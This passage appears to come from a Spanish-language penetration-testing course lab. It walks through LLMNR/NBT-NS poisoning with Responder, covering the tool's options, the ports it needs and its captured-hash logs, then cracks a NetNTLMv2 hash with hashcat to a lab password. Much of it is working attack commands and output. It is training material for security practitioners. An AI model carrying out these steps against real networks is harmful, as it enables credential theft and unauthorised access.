
----------------


--------------

## Ejemplo rápido: envenenamiento por LLMNR/NBT-NS

Veamos un ejemplo rápido del flujo de ataque a un nivel muy alto:

1. Un host intenta conectarse al servidor de impresión en \\print01.inlanefreight.local, pero accidentalmente escribe \\printer01.inlanefreight.local.
2. El servidor DNS responde, indicando que este host es desconocido.
3. A continuación, el host transmite a toda la red local preguntando si alguien conoce la ubicación de \\printer01.inlanefreight.local.
4. El atacante (nosotros con la ejecución) responde al host indicando que es la \\printer01.inlanefreight.local lo que el host está buscando.`Responder`
5. El host cree en esta respuesta y envía una solicitud de autenticación al atacante con un nombre de usuario y un hash de contraseña NTLMv2.
6. Este hash se puede descifrar sin conexión o usar en un ataque de retransmisión SMB si existen las condiciones adecuadas.


### Responder en acción

Responder es una herramienta relativamente sencilla, pero es extremadamente poderosa y tiene muchas funciones diferentes. En la sección anterior, utilizamos Responder en modo de análisis (pasivo). Esto significa que escuchó las solicitudes de resolución, pero no las respondió ni envió paquetes envenenados. Actuábamos como una mosca en la pared, solo escuchando. Ahora, llevaremos las cosas un paso más allá y dejaremos que Responder haga lo que mejor sabe hacer. Veamos algunas opciones disponibles escribiendo en nuestra consola.`Initial Enumeration``responder -h`

  Envenenamiento de LLMNR/NBT-NS - desde Linux

```shell-session
zunderrubb@htb[/htb]$ responder -h
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -r -f
or:
responder -I eth0 -wrf

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
  -f, --fingerprint     This option allows you to fingerprint a host that
                        issued an NBT-NS or LLMNR query.
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective when combined with
                        -r. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  -v, --verbose         Increase verbosity.
```

Como se mostró anteriormente en el módulo, la bandera nos pone en modo de análisis, lo que nos permite ver las solicitudes NBT-NS, BROWSER y LLMNR en el entorno sin envenenar ninguna respuesta. Siempre debemos proporcionar una interfaz o una IP. Algunas opciones comunes que normalmente querremos usar son; esto iniciará el servidor proxy no autorizado WPAD, mientras que intentará tomar huellas digitales del sistema operativo y la versión del host remoto. Podemos usar la bandera para aumentar la verbosidad si tenemos problemas, pero esto conducirá a una gran cantidad de datos adicionales impresos en la consola. Otras opciones, como y se pueden usar para forzar la autenticación NTLM o básica y forzar la autenticación de proxy, pero pueden provocar un mensaje de inicio de sesión, por lo que deben usarse con moderación. El uso de la marca utiliza el servidor proxy WPAD incorporado. Esto puede ser muy eficaz, especialmente en organizaciones grandes, ya que capturará todas las solicitudes HTTP de los usuarios que inicien Internet Explorer si el explorador tiene habilitada la [configuración de detección automática](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11).`-A``-wf``-f``-v``-F``-P``-w`

Con esta configuración que se muestra arriba, Responder escuchará y responderá a cualquier solicitud que vea en la conexión. Si tiene éxito y logra capturar un hash, Responder lo imprimirá en la pantalla y lo escribirá en un archivo de registro por host ubicado en el directorio. Los hashes se guardan en el formato , y un hash se imprime en la consola y se almacena en su archivo de registro asociado, a menos que el modo esté habilitado. Por ejemplo, un archivo de registro puede tener el aspecto de . Los hashes también se almacenan en una base de datos SQLite que se puede configurar en el archivo de configuración, normalmente ubicado en a menos que clonemos el repositorio de Responder directamente desde GitHub.`/usr/share/responder/logs``(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt``-v``SMB-NTLMv2-SSP-172.16.5.25``Responder.conf``/usr/share/responder`

Debemos ejecutar la herramienta con privilegios sudo o como root y asegurarnos de que los siguientes puertos estén disponibles en nuestro host de ataque para que funcione mejor:

  Envenenamiento de LLMNR/NBT-NS - desde Linux

```shell-session

UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```

Cualquiera de los servidores fraudulentos (es decir, SMB) se puede deshabilitar en el archivo.`Responder.conf`

#### Registros de respuesta

  Envenenamiento de LLMNR/NBT-NS - desde Linux

```shell-session
zunderrubb@htb[/htb]$ ls

Analyzer-Session.log                Responder-Session.log
Config-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt
HTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txt
Poisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txt
Proxy-Auth-NTLMv2-172.16.5.200.txt
```

Si Responder capturó correctamente los hashes, como se ve arriba, podemos encontrar los hashes asociados con cada host/protocolo en su propio archivo de texto. La siguiente animación nos muestra un ejemplo de Responder ejecutándose y capturando hashes en la red.

Podemos iniciar una sesión de Responder con bastante rapidez:

#### Inicio del respondedor con la configuración predeterminada

Código: bash

```bash
sudo responder -I ens224 
```

#### Captura con Responder

![imagen](https://academy.hackthebox.com/storage/modules/143/responder_hashes.png)

#### Descifrar un hash NTLMv2 con hashcat

  Envenenamiento de LLMNR/NBT-NS - desde Linux

```shell-session
zunderrubb@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...000000
Time.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)
Time.Estimated...: Mon Feb 28 15:20:41 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1086.9 kH/s (2.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10967040/14344385 (76.46%)
Rejected.........: 0/10967040 (0.00%)
Restore.Point....: 10960896/14344385 (76.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: L0VEABLE -> Kittikat

Started: Mon Feb 28 15:20:29 2022
Stopped: Mon Feb 28 15:20:42 2022
```
